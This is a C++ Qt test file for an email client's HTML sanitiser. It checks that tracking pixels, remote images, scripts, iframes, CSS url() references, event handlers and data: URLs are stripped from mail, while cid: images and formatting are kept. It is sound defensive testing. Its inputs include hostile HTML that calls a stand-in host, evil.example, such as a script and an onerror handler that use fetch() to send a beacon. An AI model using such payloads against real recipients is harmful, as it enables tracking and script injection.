/*
 * qtmaildir - a Qt6 mail client for notmuch-indexed Maildirs
 * Copyright (C) 2026 Danilo M. <danix@danix.xyz>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <QtTest>
#include <QRegularExpression>

#include "htmlsanitiser.h"

/// Item 171's security half.
///
/// Every test here asserts on the STRING, never on a render. A rendering probe
/// cannot see this defect by construction: a tracking pixel is a 1x1
/// transparent image, invisible by design, so a probe that renders the output
/// and looks at it would endorse the exact thing being guarded against.
class TestHtmlSanitiser : public QObject
{
    Q_OBJECT

private slots:
    void aCidReferenceSurvives();
    void aRemoteImageIsRemoved();
    void anUnquotedRemoteUrlIsRemoved();
    void aProtocolRelativeUrlIsRemoved();
    void quotingAndCaseAndWhitespaceDoNotHelp();
    void aFetchingElementIsRemovedWhole();
    void cssUrlIsStrippedInBothPlaces();
    void anEventHandlerIsRemoved();
    void aDataUrlIsRemoved();
    void anUnknownAttributeCarryingAUrlIsRemoved();
    void aCidWhoseIdLooksLikeAUrlSurvives();
    void structuralMarkupSurvives();
    void hasRemoteContentAnswersForTheComposer();

private:
    /// The invariant, applied to a whole output: no scheme but cid: anywhere.
    ///
    /// Deliberately crude and deliberately independent of the implementation's
    /// own patterns. A test that reused the production regexes would agree
    /// with a bug rather than catch it.
    void assertNoRemoteUrls(const QString &out);
};

void TestHtmlSanitiser::assertNoRemoteUrls(const QString &out)
{
    const QString lowered = out.toLower();
    for (const char *needle : { "http:", "https:", "//evil", "//host",
                                "data:", "file:", "ftp:" }) {
        QVERIFY2(!lowered.contains(QLatin1String(needle)),
                 qPrintable(QStringLiteral("a %1 reference survived: %2")
                                .arg(QLatin1String(needle), out)));
    }
}

/// The one thing that must NOT be stripped. A cid: travels inside the message
/// and fetches nothing, so an inline logo survives a forward.
void TestHtmlSanitiser::aCidReferenceSurvives()
{
    const QString out = HtmlSanitiser::stripRemoteContent(
        QStringLiteral("<p>hi</p><img src=\"cid:logo@example.org\">"));

    QVERIFY2(out.contains(QStringLiteral("cid:logo@example.org")),
             qPrintable(QStringLiteral("the cid was lost: ") + out));
    QVERIFY2(out.contains(QStringLiteral("<p>hi</p>")),
             qPrintable(QStringLiteral("the body was lost: ") + out));
}

/// The reported harm, in its plainest form.
void TestHtmlSanitiser::aRemoteImageIsRemoved()
{
    const QString out = HtmlSanitiser::stripRemoteContent(
        QStringLiteral("<p>hi</p><img src=\"https://evil.example/px?id=you\" "
                       "width=\"1\" height=\"1\">"));

    assertNoRemoteUrls(out);
    QVERIFY2(out.contains(QStringLiteral("<p>hi</p>")),
             qPrintable(QStringLiteral("the body was lost: ") + out));
}

/// `<img src=cid:x>` is valid HTML and unquoted references are seen in the
/// wild; namespaceCids() documents the same. An implementation that only
/// handles quoted values passes every tidy test and leaks on real mail.
void TestHtmlSanitiser::anUnquotedRemoteUrlIsRemoved()
{
    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(
        QStringLiteral("<img src=https://evil.example/px>")));
}

/// No scheme at all, and it still fetches: the recipient's client supplies
/// whichever scheme it rendered the message under. A check for "http" misses
/// this entirely.
void TestHtmlSanitiser::aProtocolRelativeUrlIsRemoved()
{
    const QString out = HtmlSanitiser::stripRemoteContent(
        QStringLiteral("<img src=\"//evil.example/px\">"));

    QVERIFY2(!out.contains(QStringLiteral("//evil.example")),
             qPrintable(QStringLiteral("a protocol-relative URL survived: ")
                        + out));
}

/// Uppercase tags, single quotes, and newlines around '=' are all real. Each
/// one alone defeats a naive pattern.
void TestHtmlSanitiser::quotingAndCaseAndWhitespaceDoNotHelp()
{
    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(
        QStringLiteral("<IMG SRC = 'https://evil.example/a'>")));

    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(
        QStringLiteral("<img\n  src\n  =\n  \"https://evil.example/b\">")));

    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(
        QStringLiteral("<img SrC=\"HTTPS://EVIL.EXAMPLE/c\">")));
}

/// These elements exist to fetch or redirect. Emptying the attribute is not
/// enough for <script>, whose CONTENT is the payload.
void TestHtmlSanitiser::aFetchingElementIsRemovedWhole()
{
    const QString out = HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<p>keep</p>"
        "<link rel=\"stylesheet\" href=\"https://evil.example/s.css\">"
        "<script>fetch('https://evil.example/beacon')</script>"
        "<iframe src=\"https://evil.example/f\"></iframe>"
        "<base href=\"https://evil.example/\">"
        "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">"));

    assertNoRemoteUrls(out);
    QVERIFY2(!out.toLower().contains(QStringLiteral("<script")),
             qPrintable(QStringLiteral("a script element survived: ") + out));
    QVERIFY2(!out.toLower().contains(QStringLiteral("<iframe")),
             qPrintable(QStringLiteral("an iframe survived: ") + out));
    QVERIFY2(out.contains(QStringLiteral("<p>keep</p>")),
             qPrintable(QStringLiteral("the body was lost: ") + out));
}

/// CSS fetches too, and it reaches the same network from two different places
/// with different terminator rules. namespaceCids() handles both for the same
/// reason.
void TestHtmlSanitiser::cssUrlIsStrippedInBothPlaces()
{
    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<div style=\"background:url(https://evil.example/bg.png)\">x</div>")));

    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<style>@import url('https://evil.example/s.css');"
        "p{background:url(https://evil.example/b.png)}</style>")));

    // The bare form terminates on ')', not on a quote.
    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<div style='background:url(//evil.example/bg.png)'>x</div>")));
}

/// The recipient's client most likely disables scripting. That is their
/// policy, not ours to assume on their behalf.
void TestHtmlSanitiser::anEventHandlerIsRemoved()
{
    const QString out = HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<img src=\"cid:x\" onerror=\"fetch('https://evil.example/b')\">"));

    assertNoRemoteUrls(out);
    QVERIFY2(!out.toLower().contains(QStringLiteral("onerror")),
             qPrintable(QStringLiteral("an event handler survived: ") + out));
}

/// A data: URL carries its payload inline, so it does not fetch, but it CAN
/// carry markup and is a standard sanitiser bypass. Removed on the allow-list
/// rule: it is not cid:, so it goes.
void TestHtmlSanitiser::aDataUrlIsRemoved()
{
    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<img src=\"data:text/html;base64,PHNjcmlwdD4=\">")));
}

/// **The allow-list's whole point.** `namespaceCids()` enumerates the
/// attributes it rewrites and scopes srcset out; doing that here would leak.
/// An attribute nobody anticipated must be handled by the DEFAULT.
void TestHtmlSanitiser::anUnknownAttributeCarryingAUrlIsRemoved()
{
    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<img srcset=\"https://evil.example/1x.png 1x, "
        "https://evil.example/2x.png 2x\">")));

    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<div data-bg=\"https://evil.example/x.png\">x</div>")));

    assertNoRemoteUrls(HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<video poster=\"https://evil.example/p.jpg\"></video>")));
}

/// A cid: id may legitimately contain something URL-shaped. Stripping on a
/// substring match rather than on the SCHEME would destroy a valid reference.
void TestHtmlSanitiser::aCidWhoseIdLooksLikeAUrlSurvives()
{
    const QString out = HtmlSanitiser::stripRemoteContent(
        QStringLiteral("<img src=\"cid:https-logo@example.org\">"));

    QVERIFY2(out.contains(QStringLiteral("cid:https-logo@example.org")),
             qPrintable(QStringLiteral("a valid cid was destroyed: ") + out));
}

/// The formatting is the entire point of the feature. A sanitiser that keeps
/// the user safe by emptying the message has not solved item 171.
void TestHtmlSanitiser::structuralMarkupSurvives()
{
    const QString out = HtmlSanitiser::stripRemoteContent(QStringLiteral(
        "<table><tr><td style=\"color:#c00;font-weight:bold\">Revenue</td>"
        "<td>up 12%</td></tr></table><ul><li>Region A</li></ul>"));

    QVERIFY2(out.contains(QStringLiteral("<table")),
             qPrintable(QStringLiteral("the table was lost: ") + out));
    QVERIFY2(out.contains(QStringLiteral("Revenue")),
             qPrintable(QStringLiteral("the text was lost: ") + out));
    QVERIFY2(out.contains(QStringLiteral("font-weight:bold")),
             qPrintable(QStringLiteral("safe styling was lost: ") + out));
    QVERIFY2(out.contains(QStringLiteral("<li>Region A</li>")),
             qPrintable(QStringLiteral("the list was lost: ") + out));
}

/// Drives whether the composer offers the checkbox at all. It must never
/// decide whether to strip.
void TestHtmlSanitiser::hasRemoteContentAnswersForTheComposer()
{
    QVERIFY(HtmlSanitiser::hasRemoteContent(
        QStringLiteral("<img src=\"https://evil.example/px\">")));
    QVERIFY(HtmlSanitiser::hasRemoteContent(
        QStringLiteral("<div style=\"background:url(//evil.example/b)\">x</div>")));

    QVERIFY(!HtmlSanitiser::hasRemoteContent(
        QStringLiteral("<p>plain</p><img src=\"cid:logo@example.org\">")));
    QVERIFY(!HtmlSanitiser::hasRemoteContent(QStringLiteral("<p>plain</p>")));
}

QTEST_MAIN(TestHtmlSanitiser)
#include "test_htmlsanitiser.moc"
